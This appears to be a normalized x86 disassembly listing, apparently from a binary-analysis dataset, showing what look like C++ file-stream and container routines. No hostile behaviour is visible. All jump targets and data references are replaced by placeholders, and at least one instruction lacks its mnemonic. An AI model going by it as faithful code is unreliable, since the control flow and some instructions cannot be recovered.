jne r-xdata
cmp edi ebx
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_100253a7
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x1
push edi
push [ esi + 0x4c ]
call sub_10025322
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov [ esi + 0x44 ] eax
mov eax [ esi + 0x20 ]
lea ecx [ esi + 0x40 ]
cmp [ eax ] ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x44 ]
mov [ eax ] ebx
mov [ eax + 0x10 ] ecx
jmp r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] ecx
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x41 ]
mov [ ecx ] eax
mov ecx esi
sub ecx eax
mov eax [ esi + 0x30 ]
add ecx 0x41
mov [ eax ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
sub_100107e9
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
cmp [ esp + 0x8 ] ecx
jne r-xdata
push [ esp + 0xc ]
push ecx
push [ esp + 0x10 ]
push eax
call sub_1002545a
add esp 0x10
test eax eax
jne r-xdata
cmp [ esp + 0xc ] ecx
jne r-xdata
push edi
mov edi [ esi + 0x4c ]
push 0x1
call sub_10010aac
mov eax esi
pop edi
jmp r-xdata
push 0x4
pop ecx
pop esi
retn 0x8
sub_10010830
push esi
mov esi ecx
cmp [ esi + 0x4c ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
push 0xffffffff
call [ eax + 0x4 ]
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x4c ]
call sub_100256e2
pop ecx
test eax eax
jge r-xdata
or eax 0xffffffff
pop esi
retn
sub_1001085b
push esi
push edi
push [ esp + 0xc ]
mov edi ecx
call sub_10010d09
mov esi eax
mov eax [ esi ]
pop ecx
mov ecx esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov eax edi
mov [ edi + 0x3c ] esi
call sub_1000bf46
and [ edi + 0x3c ] 0x0
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_1001088b
push 0x4
mov eax sub_1004eb80
call sub_10028203
mov ebx ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea edi [ esi + 0x4 ]
push edi
add ecx esi
mov [ ebp - 0x10 ] 0x1
call sub_1000beda
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_1000ae19
mov eax edi
mov [ edi ] r--data
mov [ edi + 0x48 ] 0x0
mov [ edi + 0x41 ] 0x0
call sub_1000bf46
mov eax [ rw-data ]
and [ edi + 0x4c ] 0x0
and [ edi + 0x3c ] 0x0
mov [ edi + 0x44 ] eax
or ebx 0x2
push ebx
push [ ebp + 0xc ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_100109e9
test eax eax
jne r-xdata
mov eax esi
call sub_100282db
retn 0x8
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_10003dcd
or ecx 0x4
sub_10010950
push 0x4
mov eax sub_1004cfa0
call sub_10028203
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x50 ]
mov ecx esi
call sub_100101c5
mov eax [ esi - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x4 ] r--data
call sub_100282db
retn
sub_100109e9
push 0x0
mov eax sub_1004d4ee
call sub_10028203
mov esi ecx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
xor eax eax
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10024194
add esp 0xc
test eax eax
je r-xdata
push 0x1
mov edi eax
call sub_10010aac
lea eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_10010c60
and [ ebp - 0x4 ] 0x0
push eax
call sub_10010d09
mov edi eax
mov eax [ edi ]
pop ecx
mov ecx edi
call [ eax + 0x4 ]
test al al
je r-xdata
mov eax esi
mov [ esi + 0x3c ] edi
call sub_1000bf46
and [ esi + 0x3c ] 0x0
jmp r-xdata
call sub_100282db
retn 0x8
lea ecx [ ebp + 0xc ]
call sub_10003c49
mov eax esi
jmp r-xdata
sub_10010a63
push ebx
push esi
mov esi eax
xor ebx ebx
push edi
mov edi esi
cmp [ esi + 0x4c ] ebx
je r-xdata
xor edi edi
call sub_10010af0
test al al
jne r-xdata
push [ esi + 0x4c ]
call sub_100257b5
pop ecx
test eax eax
je r-xdata
xor edi edi
mov eax esi
mov [ esi + 0x48 ] bl
mov [ esi + 0x41 ] bl
call sub_1000bf46
mov eax [ rw-data ]
mov [ esi + 0x44 ] eax
mov eax edi
pop edi
mov [ esi + 0x4c ] ebx
mov [ esi + 0x3c ] ebx
pop esi
pop ebx
retn
sub_10010aac
cmp [ esp + 0x4 ] 0x1
mov [ esi + 0x41 ] 0x0
sete al
mov [ esi + 0x48 ] al
mov eax esi
call sub_1000bf46
test edi edi
je r-xdata
mov eax [ rw-data ]
and [ esi + 0x3c ] 0x0
mov [ esi + 0x4c ] edi
mov [ esi + 0x44 ] eax
retn 0x4
lea eax [ edi + 0x8 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
lea eax [ edi + 0x4 ]
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
sub_10010af0
push 0x4c
mov eax sub_1004cdb0
call sub_1002826c
xor edi edi
cmp [ esi + 0x3c ] edi
je r-xdata
mov al 0x1
cmp [ esi + 0x41 ] 0x0
je r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0x4 ]
cmp eax 0xffffffff
jne r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_100079fe
mov [ ebp - 0x4 ] edi
xor al al
jmp r-xdata
mov [ esi + 0x41 ] 0x0
dec eax
je r-xdata
call sub_100282ef
retn
cmp [ esi + 0x41 ] 0x0
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
push [ esi + 0x4c ]
push edi
push 0x1
push eax
call sub_10024faf
add esp 0x10
cmp edi eax
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
mov edi [ ebp - 0x34 ]
sub edi eax
je r-xdata
dec eax
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
test edi edi
jne r-xdata
xor bl bl
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002020
mov al bl
jmp r-xdata
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
mov edi [ ebp - 0x1c ]
mov ebx eax
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
mov ecx [ esi + 0x3c ]
mov edx [ ecx ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x34 ]
push eax
add edi ebx
push edi
push [ ebp - 0x38 ]
lea eax [ esi + 0x44 ]
push eax
call [ edx + 0x18 ]
sub eax 0x0
je r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_10007a24
jmp r-xdata
sub_10010c73
push 0x20
mov eax sub_1004cf7a
call sub_10028203
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_1000134a
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push [ ebp + 0x10 ]
mov ecx eax
call sub_1000541a
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000136c
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10001500
mov eax [ ebp + 0x8 ]
call sub_100282db
retn
sub_10010cbe
push 0x20
mov eax sub_1004cf7a
call sub_10028203
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_1000136c
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push [ ebp + 0x10 ]
mov ecx eax
call sub_1000541a
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000136c
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10001500
mov eax [ ebp + 0x8 ]
call sub_100282db
retn
sub_10010d09
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10010dc8
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10010da6
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_100246bb
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
push [ esi + 0x14 ]
push 0x0
call sub_100033c9
pop esi
retn 0x4
sub_10010dc8
push 0x94
mov eax sub_1004d842
call sub_10028203
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x2
pop eax
call sub_100282db
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_10024389
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
mov [ ebp - 0x4 ] bl
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] ebx
call sub_100037dd
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ edi ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10010e8d
push 0x0
mov eax sub_1004ccaf
call sub_10028203
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_1000136c
push 0x0
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_10001500
mov eax esi
call sub_100282db
retn 0x1c
sub_10010ef4
push 0x338
mov eax sub_1004eb26
call sub_1002826c
mov eax [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
push r--data
lea ecx [ ebp - 0x328 ]
mov [ ebp - 0x2ec ] eax
mov [ ebp - 0x2f4 ] esi
call sub_1000134a
xor edi edi
lea eax [ ebp - 0x30 ]
inc edi
push eax
lea ebx [ ebp - 0x328 ]
mov [ ebp - 0x4 ] edi
call sub_10015ec7
pop ecx
push esi
push edi
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call sub_10001500
push r--data
lea ecx [ ebp - 0x4c ]
call sub_1000134a
push esi
push 0x2
sub esp 0x1c
lea eax [ ebp - 0x4c ]
mov ecx esp
mov [ ebp - 0x2f0 ] esp
push eax
mov [ ebp - 0x4 ] 0x4
call sub_1000136c
lea eax [ ebp - 0x30 ]
push eax
lea esi [ ebp - 0x2e4 ]
call sub_10017bfc
lea eax [ ebp - 0x30c ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x5
call sub_10017e37
mov [ ebp - 0x4 ] 0x6
push [ ebp - 0x2ec ]
call sub_1000271f
mov eax [ ebp - 0x2fc ]
sub eax [ ebp - 0x300 ]
mov esi 0x250
cdq
mov ecx esi
idiv ecx
xor ebx ebx
mov [ ebp - 0x2f4 ] edi
mov [ ebp - 0x2e8 ] ebx
test eax eax
jbe r-xdata
lea esi [ ebp - 0x30c ]
call sub_100113bd
lea ecx [ ebp - 0x2e4 ]
call sub_10017d75
push 0x0
push edi
lea ecx [ ebp - 0x4c ]
call sub_10001500
push 0x0
push edi
lea ecx [ ebp - 0x30 ]
call sub_10001500
mov eax [ ebp - 0x2ec ]
call sub_100282ef
retn
push r--data
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call sub_10004ab3
add esp 0xc
mov [ ebp - 0x2f0 ] eax
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0x2fc ]
sub eax [ ebp - 0x300 ]
mov ecx esi
cdq
idiv ecx
cmp [ ebp - 0x2e8 ] eax
jb r-xdata
mov eax [ ebp - 0x300 ]
add eax ebx
add eax 0x2c
push eax
push [ ebp - 0x2f0 ]
lea eax [ ebp - 0x328 ]
push eax
call sub_10004ab3
add esp 0xc
mov [ ebp - 0x4 ] 0x8
push eax
mov eax [ ebp - 0x2ec ]
call sub_10004644
push 0x0
push edi
lea ecx [ ebp - 0x328 ]
call sub_10001500
push 0x0
push edi
lea ecx [ ebp - 0x344 ]
mov [ ebp - 0x4 ] 0x6
call sub_10001500
mov eax [ ebp - 0x2fc ]
sub eax [ ebp - 0x300 ]
mov ecx esi
cdq
idiv ecx
inc [ ebp - 0x2e8 ]
add ebx esi
cmp [ ebp - 0x2e8 ] eax
jb r-xdata
call sub_10024832
sub_100110bc
push 0x28
mov eax sub_1004ee77
call sub_10028203
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x34 ]
push eax
call sub_10010ef4
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x28 ]
push 0x1c
cdq
pop ecx
idiv ecx
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
mov ebx eax
test eax eax
jge r-xdata
mov esi [ ebp + 0x8 ]
fstp [ ebp - 0x1c ]
fld1
push ecx
fstp [ esp ]
push 0x1
call sub_1000dfab
fld [ ebp - 0x1c ]
fldz
add esp 0xc
fsub st1
fxch st1
fadd [ r--data ]
fmulp st2
faddp st1
fcom [ ebp - 0x1c ]
fnstsw ax
test ah 0x1
je r-xdata
fadd [ r--data ]
fstp st0
call sub_1004b616
mov esi eax
cmp esi ebx
jae r-xdata
lea esi [ ebp - 0x34 ]
call sub_10001574
push [ ebp - 0x34 ]
call sub_100242e6
mov eax edi
pop ecx
call sub_100282db
retn
and [ edi ] 0x0
and [ edi + 0x4 ] 0x0
jmp r-xdata
push 0x20
call sub_10024389
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
xor esi esi
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x28 ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp esi eax
jb r-xdata
imul esi esi 0x1c
add esi [ ebp - 0x28 ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x18 ] esp
push esi
call sub_1000136c
mov esi [ ebp - 0x14 ]
call sub_10010e8d
mov esi eax
jmp r-xdata
call sub_10024832
mov [ ebp - 0x4 ] 0x0
push esi
lea ecx [ edi + 0x4 ]
mov [ edi ] esi
call sub_100113e0
push esi
push esi
push edi
call sub_10001a27
add esp 0xc
sub_100111bd
push 0xb4
mov eax sub_1004f579
call sub_10028203
mov esi ecx
xor ebx ebx
mov ecx edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x10 ] ebx
call sub_10003d21
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x1c ] 0x8
mov [ ebp - 0x10 ] 0x1
jb r-xdata
add esi 0x8
mov esi [ esi + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] bl
call sub_1000fa8d
mov eax edi
call sub_100282db
retn
lea esi [ ebp - 0xa8 ]
call sub_10011312
lea esi [ ebp - 0xc0 ]
lea eax [ ebp - 0xa8 ]
call sub_10011388
mov esi [ eax + 0x8 ]
add esi [ eax ]
sub esp 0x18
mov eax esp
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
lea ebx [ ebp - 0xa8 ]
mov [ ebp - 0x14 ] esp
call sub_1001128b
push 0x0
push esi
mov ecx edi
call sub_1000957d
cmp [ edi + 0x18 ] 0x10
jb r-xdata
push esi
lea eax [ ebp - 0xa8 ]
push eax
call sub_100100dd
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x54 ] ebx
je r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0xa8 ]
push eax
call sub_10009cec
xor ebx ebx
sub_1001128b
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebx ]
mov edx [ eax + 0x4 ]
sub esp 0x18
push esi
push edi
push 0x6
pop ecx
test [ edx + ebx + 0x8 ] cl
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
add eax ebx
mov ecx [ eax + 0x28 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffc
add ecx 0x4
push 0x1
sub esp 0x18
mov edi esp
mov eax edx
mov eax [ eax + ebx + 0x28 ]
mov edx [ eax ]
lea esi [ ebp + 0x8 ]
[ edi ] [ esi ]
lea ecx [ esp + 0x24 ]
push ecx
mov ecx eax
call [ edx + 0x28 ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
add ecx eax
cmp ecx [ r--data ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
add eax ebx
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_10003dcd
pop edi
mov eax ebx
pop esi
mov esp ebp
pop ebp
retn 0x18
or ecx 0x4
jmp r-xdata
sub_10011312
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
sub esp 0x18
test [ ecx + esi + 0x8 ] 0x6
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x28 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffc
add ecx 0x4
push 0x1
mov eax ecx
mov ecx [ eax + esi + 0x28 ]
mov eax [ ecx ]
push 0x2
push 0x0
lea edx [ esp + 0xc ]
push edx
call [ eax + 0x24 ]
mov eax [ esp ]
mov ecx [ esp + 0x8 ]
add ecx eax
cmp ecx [ r--data ]
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_10003dcd
mov eax esi
mov esp ebp
pop ebp
retn
or ecx 0x4
jmp r-xdata
sub_10011388
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add eax ecx
test [ eax + 0x8 ] 0x6
jne r-xdata
mov eax [ r--data ]
mov [ esi ] eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov eax [ eax + 0x28 ]
mov edx [ eax ]
push 0x1
push 0x1
push 0x0
push esi
mov ecx eax
call [ edx + 0x24 ]
jmp r-xdata
mov eax esi
retn
sub_100113bd
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push [ esi ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
and [ esi + 0x14 ] 0x0
call sub_100242e6
pop ecx
retn
push eax
call sub_100242e6
pop ecx
sub_100113e0
push 0x4
mov eax sub_1004ca85
call sub_10028236
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10024389
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100282db
retn 0x4
sub_10011487
push 0x88
mov eax sub_1004f52d
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc ]
push 0xf
pop edi
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0x10 ]
xor esi esi
mov ebx ecx
push esi
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x90 ] esi
mov [ ebp - 0x4c ] edi
call sub_10002004
mov [ ebp - 0x4 ] esi
push esi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] edi
call sub_10002004
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] edi
call sub_10002004
mov eax [ ebp - 0x88 ]
mov edx [ ebp - 0x8c ]
add eax 0x3c
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call sub_10008ed3
mov eax [ ebx ]
pop ecx
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx ebx
call [ eax + 0x4 ]
cmp [ ebp - 0x18 ] esi
ja r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_1001192d
mov edi [ ebp - 0x84 ]
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_100115ba
xor edi edi
push esi
inc edi
push edi
lea ecx [ ebp - 0x80 ]
call sub_10001500
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_10002020
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_10002020
push esi
push edi
lea ecx [ ebp - 0x64 ]
call sub_10002020
mov eax [ ebp - 0x84 ]
mov ebx [ ebp - 0x84 ]
push esi
lea ecx [ ebx + 0x4 ]
mov [ ebx ] esi
call sub_10011e59
push esi
push esi
push ebx
call sub_10001a27
add esp 0xc
xor edi edi
push esi
inc edi
push edi
lea ecx [ ebp - 0x2c ]
call sub_10002020
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_10002020
push esi
push edi
lea ecx [ ebp - 0x64 ]
call sub_10002020
mov eax ebx
jmp r-xdata
call sub_100282ef
retn 0xc
sub_100115ba
push 0x54
mov eax sub_1004f4e8
call sub_1002826c
mov eax [ ebp + 0x8 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
push eax
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x44 ] edi
call sub_1000136c
xor ebx ebx
lea eax [ esi + 0x3c ]
push eax
inc ebx
mov [ ebp - 0x4 ] ebx
push [ ebp - 0x38 ]
lea eax [ ebp - 0x40 ]
lea ecx [ esi + 0x8c ]
push eax
call sub_10008a76
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x40 ]
xor esi esi
cmp eax esi
jne r-xdata
cmp [ eax + 0x20 ] 0x0
jne r-xdata
lea eax [ ebp - 0x30 ]
push eax
call sub_100161b2
pop ecx
push esi
lea ecx [ edi + 0x4 ]
mov [ edi ] esi
call sub_10011e59
push esi
push esi
push edi
call sub_10001a27
add esp 0xc
mov [ ebp - 0x4 ] bl
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ebx
cmp ecx esi
je r-xdata
push 0x5c
call sub_10024389
pop ecx
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax esi
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_100014e3
push esi
jmp r-xdata
call sub_10003d5c
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x34 ] 0x2
je r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0x40 ]
call sub_10009562
lea ecx [ ebp - 0x30 ]
push ecx
mov [ ebp - 0x4 ] 0x4
push eax
push [ ebp - 0x38 ]
mov [ ebp - 0x34 ] 0x2
call sub_10013a23
mov esi eax
push ebx
lea ecx [ ebp - 0x30 ]
call sub_10001500
mov eax edi
call sub_100282ef
retn 0x8
push esi
lea ecx [ edi + 0x4 ]
mov [ edi ] esi
call sub_10011e59
push esi
push esi
push edi
call sub_10001a27
or [ ebp - 0x34 ] ebx
mov [ ebp - 0x4 ] bl
mov ecx [ ebp - 0x3c ]
add esp 0xc
test ecx ecx
je r-xdata
and [ ebp - 0x34 ] 0xfffffffd
push 0x0
push ebx
lea ecx [ ebp - 0x60 ]
call sub_10002020
push 0x0
call sub_10003d5c
sub_100116ea
push ebp
sub esp 0x8c
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x8c ] eax
push 0x58
mov eax sub_1004f8a0
call sub_10028236
mov eax [ ebp + 0x98 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x9c ]
xor esi esi
mov [ ebp - 0x4 ] esi
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x20 ] esi
call sub_100119cb
mov [ ebp - 0x4 ] esi
inc esi
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x20 ] esi
call sub_1000134a
lea eax [ ebp ]
push eax
lea ebx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] esi
call sub_10015ec7
pop ecx
xor edi edi
push edi
push esi
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call sub_10001500
push edi
lea eax [ ebp ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10011dc6
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x4
call sub_10012643
push edi
push esi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x6
call sub_10001500
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x18 ]
cmp ecx edi
je r-xdata
push [ ebp - 0x1c ]
lea eax [ ebp + 0x1c ]
push eax
call sub_10011dfd
lea eax [ ebp + 0x1c ]
push eax
lea ecx [ ebp + 0x70 ]
mov [ ebp - 0x4 ] 0x7
call sub_1000136c
push r--data
lea ecx [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0x8
call sub_1000134a
mov [ ebp - 0x4 ] 0x9
mov eax [ ebp + 0x84 ]
push [ ebp + 0x68 ]
sub eax [ ebp + 0x68 ]
lea ecx [ ebp + 0x70 ]
push eax
lea eax [ ebp + 0x38 ]
push eax
call sub_10004622
mov ecx eax
lea eax [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0xa
call sub_10003270
mov bl al
neg bl
push edi
sbb bl bl
push esi
lea ecx [ ebp + 0x38 ]
inc bl
call sub_10001500
test bl bl
je r-xdata
push edi
push esi
lea ecx [ ebp ]
call sub_10001500
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x8c ]
xor ecx ebp
call sub_100242d7
add ebp 0x90
leave
retn 0x8
call sub_10003d5c
lea ecx [ ebp + 0x70 ]
lea edi [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0xb
call sub_10016561
mov ecx [ ebp - 0x2c ]
lea eax [ ebp + 0x70 ]
push eax
mov eax edi
push eax
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0xc
call sub_100115ba
xor edi edi
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x28 ] edi
je r-xdata
push edi
push esi
lea ecx [ ebp + 0x54 ]
call sub_10001500
push edi
push esi
lea ecx [ ebp + 0x70 ]
call sub_10001500
push edi
push esi
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x6
call sub_10001500
jmp r-xdata
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x24 ]
cmp ecx edi
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x14 ]
call sub_10011a08
lea eax [ ebp - 0x1c ]
push edi
push eax
call sub_1003c635
pop ecx
pop ecx
jmp r-xdata
push edi
push esi
lea ecx [ ebp + 0x38 ]
call sub_10002020
mov [ ebp - 0x4 ] 0x9
jmp r-xdata
call sub_10003d5c
cmp [ ebp - 0x1c ] edi
setne al
test al al
je r-xdata
push edi
push esi
lea ecx [ ebp + 0x54 ]
call sub_10001500
push edi
